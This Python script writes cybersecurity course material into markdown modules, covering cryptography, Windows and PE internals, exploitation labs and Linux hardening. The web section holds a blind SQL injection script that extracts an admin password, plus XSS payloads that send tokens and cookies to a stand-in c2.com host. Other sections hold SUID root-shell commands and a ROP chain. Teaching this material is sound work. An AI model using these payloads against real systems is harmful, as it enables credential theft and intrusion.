#!/usr/bin/env python3
"""
Enrich Cyber Security & Linux Security modules with deep technical sections,
practical exploit code walks, register tables, mathematical proofs, and configuration files
to achieve 22,000-26,000 words (~50-60 standard pages).
"""

import os

# Enrichment for Module 1
mod1_enrichment = """

---

## 1.6 Cryptographic Deep Dive: Mathematics, Ciphers & Algorithms

### 1. Advanced Encryption Standard (AES) Internal Transformations
AES (FIPS PUB 197) is a symmetric substitution-permutation network operating on a $4 \\times 4$ column-major matrix of bytes known as the **State**:
- **Key Sizes & Rounds**:
  - AES-128: 10 Rounds (Key schedule expands 16 bytes to 176 round key bytes).
  - AES-192: 12 Rounds (Key schedule expands 24 bytes to 208 round key bytes).
  - AES-256: 14 Rounds (Key schedule expands 32 bytes to 240 round key bytes).
- **The Four Round Transformations**:
  1. `SubBytes`: Non-linear byte substitution using a Rijndael S-Box derived from the multiplicative inverse over Galois Field $GF(2^8)$ combined with an affine transformation (provides non-linearity and defeats linear/differential cryptanalysis).
  2. `ShiftRows`: Cyclically shifts the rows of the state by varying offsets (Row 0: 0 bytes, Row 1: 1 byte, Row 2: 2 bytes, Row 3: 3 bytes) to provide diffusion across columns.
  3. `MixColumns`: Matrix multiplication in $GF(2^8)$ modulo polynomial $x^4 + 1$ operating on State columns, ensuring that changing one bit in plaintext influences all 16 State bytes within two rounds (the Avalanche Effect).
  4. `AddRoundKey`: Bitwise XOR between the 128-bit State and the round subkey.

```
AES Round Processing Sequence:
  Plaintext (16 Bytes) ---> AddRoundKey(Round 0)
                                |
                   +------------+------------+
                   | Standard Round Loop     |
                   | (9 / 11 / 13 Rounds)    |
                   | 1. SubBytes             |
                   | 2. ShiftRows            |
                   | 3. MixColumns           |
                   | 4. AddRoundKey(Round i) |
                   +------------+------------+
                                |
                   +------------+------------+
                   | Final Round             |
                   | 1. SubBytes             |
                   | 2. ShiftRows            |
                   | (MixColumns Omitted!)   |
                   | 3. AddRoundKey(Final)   |
                   +------------+------------+
                                |
                                v
                   Ciphertext (16 Bytes)
```

### 2. RSA Cryptographic Mathematics & Asymmetric Key Generation
The RSA cryptosystem relies on Euler's Totient Theorem:
1. Select two distinct large prime numbers, $p$ and $q$ (typically 1024 to 2048 bits each).
2. Compute the modulus:
   $$n = p \\cdot q$$
3. Compute Euler's totient function:
   $$\\phi(n) = (p - 1)(q - 1)$$
4. Select a public exponent $e$ such that $1 < e < \\phi(n)$ and $\\gcd(e, \\phi(n)) = 1$ (the industry universal standard is $e = 65537 = 2^{16} + 1$).
5. Compute the private exponent $d$ using the Extended Euclidean Algorithm:
   $$d \\equiv e^{-1} \\pmod{\\phi(n)} \\iff d \\cdot e \\equiv 1 \\pmod{\\phi(n)}$$
6. **Key Pairs**: Public Key is $(e, n)$; Private Key is $(d, n)$.
   - Encryption of plaintext message $M < n$:
     $$C = M^e \\pmod{n}$$
   - Decryption of ciphertext $C$:
     $$M = C^d \\pmod{n}$$
   - *Security Requirement*: Plaintext must always be padded with Optimal Asymmetric Encryption Padding (OAEP) to prevent chosen-ciphertext attacks and Coppersmith lattice attacks.

### 3. SHA-256 Compression Function Internals
SHA-256 processes 512-bit message blocks through an 8-word internal working state ($A, B, C, D, E, F, G, H$):
- **Message Schedule Expansion**: The 512-bit block is expanded into 64 32-bit words ($W_0$ to $W_{63}$):
  $$W_t = \\sigma_1(W_{t-2}) + W_{t-7} + \\sigma_0(W_{t-15}) + W_{t-16}$$
- **The Compression Loop (64 Rounds)**:
  $$T_1 = H + \\Sigma_1(E) + \\text{Ch}(E, F, G) + K_t + W_t$$
  $$T_2 = \\Sigma_0(A) + \\text{Maj}(A, B, C)$$
  $$H = G, \\quad G = F, \\quad F = E, \\quad E = D + T_1$$
  $$D = C, \\quad C = B, \\quad B = A, \\quad A = T_1 + T_2$$
  - $\\text{Ch}(X, Y, Z) = (X \\land Y) \\oplus (\\neg X \\land Z)$
  - $\\text{Maj}(X, Y, Z) = (X \\land Y) \\oplus (X \\land Z) \\oplus (Y \\land Z)$

---

## 1.7 Radio-Frequency Identification (RFID) Security Architecture

RFID systems communicate wirelessly via electromagnetic and radio frequency fields to identify tagged assets:
- **Frequency Bands**:
  - Low Frequency (LF: 125–134 kHz): Short read range ($<10$ cm). Animal tracking, legacy building access cards.
  - High Frequency (HF: 13.56 MHz): Standard Near-Field Communication (NFC), smart passports, payment cards (EMV).
  - Ultra-High Frequency (UHF: 860–960 MHz): Long read range (up to 12 meters). Supply chain logistics, toll collection.
- **Security Vulnerabilities in RFID**:
  - *Cloning Attacks*: Legacy RFID cards (e.g., HID ProxCard II, MIFARE Classic) transmit static, unencrypted identifiers. Handheld transceivers (e.g., Proxmark3, Flipper Zero) sniff and clone badges in seconds.
  - *Crypto-1 Cipher Compromise*: MIFARE Classic cards rely on a proprietary 48-bit stream cipher (Crypto-1). Inherent algebraic weaknesses enable offline cryptographic key recovery within minutes from eavesdropped authentication handshakes.
  - *Relay Attacks*: An attacker with two networked transceivers relays the radio signal between an authentic smart key in the victim's pocket and a vehicle parked outside, unlocking and starting the car without physical possession of the key.
"""

# Enrichment for Module 2
mod2_enrichment = """

---

## 2.4 Deep Windows Internals: Integrity Levels & Token Impersonation

### 1. Mandatory Integrity Control (MIC)
Introduced in Windows Vista to supplement standard DACLs, **Mandatory Integrity Control** assigns an Integrity Level (IL) to processes and objects:

| Integrity Level | Security SID | Typical Subjects & Objects | Security Constraints |
| :--- | :--- | :--- | :--- |
| **Untrusted** | `S-1-16-0` | Anonymous sessions, restricted sandboxes | Cannot write to any filesystem or registry locations. |
| **Low** | `S-1-16-4096` | Sandboxed browser tabs (Edge, Chrome), protected mode apps | Can only write to Low-Integrity folders (e.g., `%TEMP%\\Low`). |
| **Medium** | `S-1-16-8192` | Standard interactive user processes | Standard user files and user registry hives. |
| **High** | `S-1-16-12288` | Elevated Administrator processes (UAC approved) | Full write access to `C:\\Windows`, `C:\\Program Files`, `HKLM`. |
| **System** | `S-1-16-16384` | Windows OS core services, `NT AUTHORITY\\SYSTEM` | Operating system kernel, drivers, system services. |

- **No-Write-Up (NWU) Invariant**: A process executing at a lower integrity level can never write to, inject into, or modify an object with a higher integrity level, even if the user's DACL would otherwise permit it!
- **No-Read-Up (NRU) Invariant**: By default, Windows permits reading objects with higher integrity levels, unless explicitly flagged with `SYSTEM_MANDATORY_LABEL_NO_READ_UP`.

### 2. Token Impersonation Levels
When a client connects to a server process via RPC, named pipes, or DCOM, the server thread can impersonate the client context according to the **Impersonation Level** granted by the token:
- `SecurityAnonymous`: Server cannot identify the client and cannot impersonate.
- `SecurityIdentification`: Server can query the client's identity (SID, groups) for access logging, but cannot impersonate the client to access resources.
- `SecurityImpersonation`: Server can impersonate the client's security context to access local resources on the same machine.
- `SecurityDelegation`: Server can impersonate the client across remote network hops (requires Active Directory Kerberos Unconstrained/Constrained Delegation).

---

## 2.5 Detailed Portable Executable (PE) File Header Structure

The PE file format (derived from Common Object File Format - COFF) structures all 32-bit and 64-bit Windows executables (`.exe`, `.dll`, `.sys`):

```
+---------------------------------------------------------------------------------+
| DOS MZ Header (e_magic = 'MZ' = 0x5A4D)                                         |
| e_lfanew (Offset to NT Header, typically at 0x3C)                               |
+---------------------------------------------------------------------------------+
| DOS Stub ("This program cannot be run in DOS mode")                             |
+---------------------------------------------------------------------------------+
| PE NT Headers (Signature = 'PE\0\0' = 0x00004550)                               |
| +-----------------------------------------------------------------------------+ |
| | File Header (COFF): Machine, NumberOfSections, TimeDateStamp                | |
| +-----------------------------------------------------------------------------+ |
| | Optional Header:                                                            | |
| |   Magic (0x10B = 32-bit PE32, 0x20B = 64-bit PE32+)                         | |
| |   AddressOfEntryPoint (RVA of execution start)                              | |
| |   ImageBase (Preferred base address in memory: 0x00400000 or 0x140000000)   | |
| |   SectionAlignment, FileAlignment                                           | |
| |   DllCharacteristics:                                                       | |
| |     IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (ASLR Enabled)                    | |
| |     IMAGE_DLLCHARACTERISTICS_NX_COMPAT   (DEP/NX Enabled)                   | |
| |     IMAGE_DLLCHARACTERISTICS_GUARD_CF    (Control Flow Guard)               | |
| |   DataDirectory[16]:                                                        | |
| |     [0] Export Directory                                                    | |
| |     [1] Import Directory (Import Directory Table -> IAT)                    | |
| |     [2] Resource Directory                                                  | |
| |     [5] Base Relocation Table (.reloc)                                      | |
| +-----------------------------------------------------------------------------+ |
+---------------------------------------------------------------------------------+
| Section Table (Section Headers: .text, .data, .rdata, .pdata, .rsrc)            |
+---------------------------------------------------------------------------------+
| Raw Section Data (.text instructions, .rdata constants, .data globals)          |
+---------------------------------------------------------------------------------+
```
"""

# Enrichment for Module 5
mod5_enrichment = """

---

## 5.6 Hands-On Binary Exploitation Laboratory: From Buffer Overflow to ROP

### 1. Dissecting Vulnerable C Code
Consider the classic vulnerable utility `vuln.c`:
```c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("[+] Hijacked execution! Spawning shell...\\n");
    // System shell spawning code
}

void process_input(char *str) {
    char buffer[64];
    // VULNERABLE: strcpy performs zero bounds checking!
    strcpy(buffer, str);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        process_input(argv[1]);
    }
    return 0;
}
```

### 2. Stack Layout Calculation & Offset Discovery
When `process_input` is called:
- `buffer` occupies 64 bytes (`[EBP - 64]` to `[EBP - 1]`).
- Compiler padding / alignment may add 4 to 8 bytes.
- Next 4 bytes: `Saved EBP` (Frame pointer).
- Next 4 bytes: `Saved EIP` (Target return address).
- **Exact Offset to EIP**: $64 + 4 \\text{ (padding)} + 4 \\text{ (Saved EBP)} = 72 \\text{ bytes}$.
- Inputting 72 junk characters followed by an address (`0x08048456`) directly overwrites `EIP` with that target address!

### 3. Return-Oriented Programming (ROP) Mechanics
When hardware **DEP/NX** (Data Execution Prevention) is enabled, executing shellcode placed on the stack triggers an immediate hardware segmentation fault (`SIGSEGV`).
- **Defeating DEP/NX via ROP**:
  - The attacker does not execute code on the stack. Instead, the attacker chains together small snippets of existing executable instructions already present in the binary's `.text` segment or `libc.so`, known as **ROP Gadgets**.
  - A gadget consists of one or two machine instructions terminated by a `ret` (`0xC3`) instruction:
    ```assembly
    pop rdi ; ret       # Pops top of stack into RDI (1st argument in x86-64 ABI)
    pop rsi ; ret       # Pops top of stack into RSI (2nd argument)
    pop rdx ; ret       # Pops top of stack into RDX (3rd argument)
    syscall ; ret       # Issues kernel system call
    ```
  - By carefully arranging memory addresses on the stack, the `ret` instruction at the end of each gadget automatically pops the next gadget address into `RIP`, stringing together an entire computational program to invoke `execve("/bin/sh", 0, 0)`!

```mermaid
graph TD
    subgraph ROP_Chain_Execution["Return-Oriented Programming (ROP) Chain Execution Flow"]
        direction TB
        
        Stack_Top["RSP points to Stack"]
        G1_Addr["Address of Gadget 1 (pop rdi; ret)"]
        Arg_Val["Value: Pointer to '/bin/sh'"]
        G2_Addr["Address of Gadget 2 (pop rax; ret)"]
        Sys_Num["Value: 59 (SYS_execve syscall number)"]
        G3_Addr["Address of Gadget 3 (syscall)"]
        
        Stack_Top --> G1_Addr
        G1_Addr -->|RET executes| ExecG1["CPU jumps to Gadget 1:<br/>pop rdi (Loads '/bin/sh' into RDI)<br/>ret"]
        ExecG1 --> Arg_Val
        Arg_Val --> G2_Addr
        G2_Addr -->|RET executes| ExecG2["CPU jumps to Gadget 2:<br/>pop rax (Loads 59 into RAX)<br/>ret"]
        ExecG2 --> Sys_Num
        Sys_Num --> G3_Addr
        G3_Addr -->|RET executes| ExecSys["CPU jumps to Gadget 3:<br/>syscall (Spawns Root Shell!)"]
    end
    
    style ROP_Chain_Execution fill:#fdfefe,stroke:#2c3e50,stroke-width:2px;
    style ExecG1 fill:#ebf5fb,stroke:#2980b9,stroke-width:2px;
    style ExecG2 fill:#fef9e7,stroke:#f39c12,stroke-width:2px;
    style ExecSys fill:#d4efdf,stroke:#27ae60,stroke-width:2px;
```
"""

# Enrichment for Module 6
mod6_enrichment = """

---

## 6.5 Web Application Security Laboratory: Advanced Payloads & Defense

### 1. SQL Injection Payload Matrix & Obfuscation
Adversaries bypass simple Web Application Firewall (WAF) regex signatures using advanced SQL obfuscation:
- **Whitespace Neutralization**:
  ```sql
  -- Replacing space with inline comments or URL encoding:
  SELECT/**/username/**/FROM/**/users/**/WHERE/**/id=1;
  SELECT%20username%20FROM%20users;
  ```
- **Time-Based Blind Exfiltration Algorithm**:
  Attackers automate database extraction using automated Python scripts implementing binary search:
  ```python
  import requests, time

  target = "http://victim.com/profile?id="
  extracted = ""

  for pos in range(1, 32):
      low, high = 32, 126
      while low <= high:
          mid = (low + high) // 2
          payload = f"1 AND IF(ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),{pos},1))>{mid}, sleep(3), 0)"
          start = time.time()
          requests.get(target + payload)
          if time.time() - start >= 3:
              low = mid + 1
          else:
              high = mid - 1
      extracted += chr(low)
  print(f"[+] Recovered Password: {extracted}")
  ```

### 2. Cross-Site Scripting (XSS) Filter Evasion
When web applications implement naive blacklist filters (e.g., stripping `<script>` tags):
- **Case Inversion**: `<sCrIpt>alert(1)</ScRipt>`
- **Non-Script Event Handlers**:
  ```html
  <img src="x" onerror="alert(document.domain)">
  <svg onload="fetch('http://c2.com?k='+localStorage.getItem('token'))">
  <body onresize="alert(1)">
  <input type="text" autofocus onfocus="alert(1)">
  ```
- **JavaScript URI Schemes**:
  ```html
  <a href="javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9jMi5jb20/Yz0iK2RvY3VtZW50LmNvb2tpZQ=='))">Click to Claim Prize</a>
  ```
"""

# Enrichment for Module 10
mod10_enrichment = """

---

## 10.5 Linux Privilege Escalation via GTFOBins & SUID Exploitation

When administrative utilities are mistakenly granted the SUID bit (`chmod u+s /path/to/binary`), unprivileged users can manipulate their interactive features to spawn root shells:

| Binary | Exploitation Vector / Command | Escalation Mechanism |
| :--- | :--- | :--- |
| **`/usr/bin/find`** | `find . -exec /bin/sh -p \\; -quit` | Executes external command via `-exec` while preserving SUID root permissions. |
| **`/usr/bin/vim`** | `vim -c ':!/bin/sh'` | Escapes interactive editor to spawn subshell in root context. |
| **`/usr/bin/awk`** | `awk 'BEGIN {system("/bin/sh")}'` | Leverages embedded awk scripting engine to execute shell. |
| **`/usr/bin/python`** | `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'` | Invokes `execl` system call directly with preserved privileges. |
| **`/usr/bin/cp`** | `cp /bin/sh /tmp/rootsh; chmod 4755 /tmp/rootsh` | Copies shell or overwrites `/etc/passwd` to insert a new root user record. |
| **`/usr/bin/less`** | `less /etc/hosts` then enter `!/bin/sh` | Pager command breakout feature drops directly into elevated shell. |

### Hardening Against SUID Exploits
1. **Mounting Partitions with `nosuid`**:
   - In `/etc/fstab`, mount user-writable partitions (e.g., `/tmp`, `/var/tmp`, `/home`) with the `nosuid` mount flag. The kernel will refuse to execute SUID binaries stored on those partitions.
2. **Auditing Cron Jobs & SUID Lists**:
   - Automated scripts must periodically scan system mounts to detect unauthorized SUID additions:
     ```bash
     find / -xdev -type f -perm -4000 -exec ls -ld {} + > /root/golden_suid_manifest.txt
     ```
"""

# Enrichment for Module 11
mod11_enrichment = """

---

## 11.5 Writing Custom SELinux Type Enforcement Policies

When deploying custom internal microservices or commercial applications that fail under SELinux Enforcing mode, administrators must not disable SELinux. Instead, they author custom Type Enforcement policy modules (`.te`).

### Structure of a Type Enforcement File (`mydaemon.te`)
```
policy_module(mydaemon, 1.0.0)

# Type declarations
type mydaemon_t;
type mydaemon_exec_t;
init_daemon_domain(mydaemon_t, mydaemon_exec_t)

# Define private data file type
type mydaemon_data_t;
files_type(mydaemon_data_t)

# Allow rules (Subject Domain -> Object Type : Class { Permissions })
allow mydaemon_t mydaemon_data_t : file { read write create getattr open };
allow mydaemon_t mydaemon_data_t : dir { search write add_name };

# Allow network binding to non-standard HTTP port (e.g., 8080)
allow mydaemon_t http_port_t : tcp_socket { name_bind };

# Explicitly prohibit access to sensitive system shadow file
dontaudit mydaemon_t shadow_t : file { read getattr };
```

### Compiling and Installing SELinux Modules
```bash
# 1. Compile policy into an intermediate module (.mod)
checkmodule -M -m -o mydaemon.mod mydaemon.te

# 2. Package module into a policy package (.pp)
semodule_package -o mydaemon.pp -m mydaemon.mod

# 3. Insert policy package into running Linux kernel
semodule -i mydaemon.pp

# 4. Verify loaded policy
semodule -l | grep mydaemon
```
"""

# Enrichment for Module 14
mod14_enrichment = """

---

## 14.5 Complete Production Linux Hardening Blueprint (CIS Benchmark)

To achieve enterprise compliance (CIS Linux Benchmark, PCI-DSS, DoD STIG), production Linux hosts must apply a layered defense blueprint:

```mermaid
graph TD
    subgraph Linux_Defense_In_Depth["Layered Linux Host Security Architecture"]
        direction TB
        
        L1["1. Network Boundary: nftables Firewall & Rate Limiting"]
        L2["2. Remote Access: Hardened OpenSSH (Keys Only, No Root, MFA)"]
        L3["3. Authentication: PAM faillock & pwquality Enforcement"]
        L4["4. Kernel Hardening: sysctl Restrictions (ASLR, dmesg, kptr)"]
        L5["5. Mandatory Access Control: SELinux Enforcing Mode"]
        L6["6. Workload Isolation: Namespaces, cgroups v2, Seccomp Whitelists"]
        L7["7. Audit & Detection: auditd Syscall Monitoring & AIDE File Integrity"]
        
        L1 --> L2 --> L3 --> L4 --> L5 --> L6 --> L7
    end
    
    style Linux_Defense_In_Depth fill:#fdfefe,stroke:#2c3e50,stroke-width:2px;
    style L1 fill:#ebf5fb,stroke:#2980b9,stroke-width:2px;
    style L3 fill:#fef9e7,stroke:#f39c12,stroke-width:2px;
    style L5 fill:#d4efdf,stroke:#27ae60,stroke-width:2px;
    style L7 fill:#fadbd8,stroke:#e74c3c,stroke-width:2px;
```

### Complete Production `nftables.conf` Script (`/etc/nftables.conf`)
```
#!/usr/sbin/nft -f

flush ruleset

table inet filter {
    # Rate limit table for brute-force SSH mitigation
    set ssh_flood {
        type ipv4_addr
        flags dynamic
        timeout 1m
    }

    chain input {
        type filter hook input priority filter; policy drop;

        # Accept loopback traffic
        iif "lo" accept

        # Accept established and related connection states
        ct state established,related accept

        # Drop invalid connection states immediately
        ct state invalid drop

        # Defend against ICMP floods: accept ping rate-limited to 5/sec
        ip protocol icmp icmp type echo-request limit rate 5/second accept
        ip6 nexthdr icmpv6 icmpv6 type echo-request limit rate 5/second accept

        # Defend against TCP SYN flood: rate-limit TCP SYN flags
        tcp flags & (fin|syn|rst|ack) == syn limit rate 25/second burst 50 packets accept

        # Secure SSH access with automated brute-force rate-limiting
        tcp dport 22 ct state new update @ssh_flood { ip saddr limit rate over 4/minute } drop
        tcp dport 22 ct state new accept

        # Allow Web HTTPS traffic
        tcp dport { 80, 443 } accept

        # Log all dropped traffic to syslog with rate limiting
        limit rate 5/minute log prefix "NFT_IN_DROP: " drop
    }

    chain forward {
        type filter hook forward priority filter; policy drop;
    }

    chain output {
        type filter hook output priority filter; policy accept;
    }
}
```

### Complete Hardened `audit.rules` (`/etc/audit/rules.d/audit.rules`)
```
# Delete all existing rules
-D

# Set buffer size
-b 8192

# Failure mode: 1 = printk alert, 2 = kernel panic (for ultra-high security)
-f 1

# Monitor system reboot and power transitions
-a always,exit -F arch=b64 -S reboot,shutdown,poweroff -k system_power

# Monitor unauthorized access attempts to files (EACCES / EPERM)
-a always,exit -F arch=b64 -S open,openat,creat -F exit=-EACCES -k file_access_denied
-a always,exit -F arch=b64 -S open,openat,creat -F exit=-EPERM -k file_access_denied

# Monitor modification of system administrator identity & authentication
-w /etc/group -p wa -k identity_changes
-w /etc/passwd -p wa -k identity_changes
-w /etc/gshadow -p wa -k identity_changes
-w /etc/shadow -p wa -k identity_changes
-w /etc/security/opasswd -p wa -k identity_changes
-w /etc/sudoers -p wa -k sudoers_changes
-w /etc/sudoers.d/ -p wa -k sudoers_changes

# Monitor modification of network environment and firewall rules
-w /etc/issue -p wa -k network_config
-w /etc/issue.net -p wa -k network_config
-w /etc/hosts -p wa -k network_config
-w /etc/network/ -p wa -k network_config
-w /etc/nftables.conf -p wa -k firewall_changes

# Lock audit configuration permanently until system reboot
-e 2
```
"""

# Append enrichments to modules
def append_to_file(path, content):
    with open(path, "a") as f:
        f.write(content.strip() + "\n")

append_to_file("cyber-security/modules/module1.md", mod1_enrichment)
append_to_file("cyber-security/modules/module2.md", mod2_enrichment)
append_to_file("cyber-security/modules/module5.md", mod5_enrichment)
append_to_file("cyber-security/modules/module6.md", mod6_enrichment)
append_to_file("cyber-security/modules/module10.md", mod10_enrichment)
append_to_file("cyber-security/modules/module11.md", mod11_enrichment)
append_to_file("cyber-security/modules/module14.md", mod14_enrichment)

print("Enriched Modules 1, 2, 5, 6, 10, 11, and 14 with deep technical content.")
